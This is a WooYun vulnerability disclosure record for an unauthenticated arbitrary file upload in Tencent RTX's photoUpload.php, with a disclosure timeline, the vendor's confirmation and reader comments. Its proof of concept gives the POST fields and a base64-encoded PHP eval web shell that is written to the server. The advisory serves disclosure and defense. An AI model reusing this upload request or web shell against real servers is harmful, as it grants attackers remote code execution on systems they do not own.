{"id": 21823, "wybug_id": "wooyun-2011-03198", "wybug_title": "腾讯RTX上传任意文件漏洞", "wybug_corp": "腾讯", "wybug_author": "小恒", "wybug_date": "2011-11-03 09:07", "wybug_open_date": "2011-12-03 09:07", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计缺陷", "内网渗透", "任意文件上传", "文件上传过滤不严", "渗透测试思路", "敏感接口未加权限认证", "网络边界绕过", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-11-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-11-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-11-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2011-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-12-03：\t细节向公众公开  简要描述： 安装RTX后打开IP:8012网址腾讯RTX存在UserPhoto/photoUpload.php任意文件上传漏洞 详细说明：  简单的一个post表单即可上传$user_account \t= $_POST['user_account'];$file_name \t= $_POST[\"file_name\"];$file_data \t= $_POST[\"file_data\"];无任何过滤   漏洞证明：  \n\nuser_account=1000file_name=s.phpfile_data=PD9waHAgZXZhbCgkX1BPU1Rbc2JdKT8+file_data为base64_encode数据post提交后UserPhoto目录下生成PhotoFiles/s.php需要extension=php_mbstring.dll开启及php4   修复方案：  上传过滤   版权声明：转载请注明来源 小恒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2011-11-03 14:12 厂商回复： thx 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-11-03 11:14 |    \t\t80sec \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:5        | 不要停止我的音乐)\t\t \n  .....    \n     2011-11-03 12:53 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  简要描述那么清楚。。。    \n     2012-03-05 09:34 |    \t\tsoftbug \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:10        | 为人类设计最好的软件，解放人的双手,一起...)\t\t \n  3ks.    \n     2012-04-08 17:35 |    \t\t匿名者 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 没啥，蛋疼时候就发布点东西)\t\t \n  好简单的回复。。    \n     2012-12-30 10:15 |    \t\t167怪兽 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | 167怪兽)\t\t \n  一个个傻啊  有点洞就上传乌云！！自己在手留着！！一个个傻~  乌云给你们什么好处？？？最后获利的是谁？？自己想想吧`    \n     2013-04-05 13:16 |    \t\t天星宿命 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | ios专业开发,业余白帽子)\t\t \n  这个,没有extension=php_mbstring.dll ...    \n     2013-05-08 19:28 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:7        )\t\t \n  @167怪兽 所以才有傻冒的说法白猫子就是这种想法。黑帽子眼中只有钱比不了国外啊。个个分享精神比较高    \n     2013-06-14 09:55 |    \t\t噬魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:37        | 08安全团队)\t\t \n  围观大牛    \n     2013-06-28 11:01 |    \t\tSnow陈伦 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 闷骚的家伙，何处都是你的战场。)\t\t \n  坚持大无畏？还是生活所迫继续黑下去，一个玩偶的事情？    \n     2013-12-15 01:03 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  @天星宿命 貌似是有这个情况哎    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}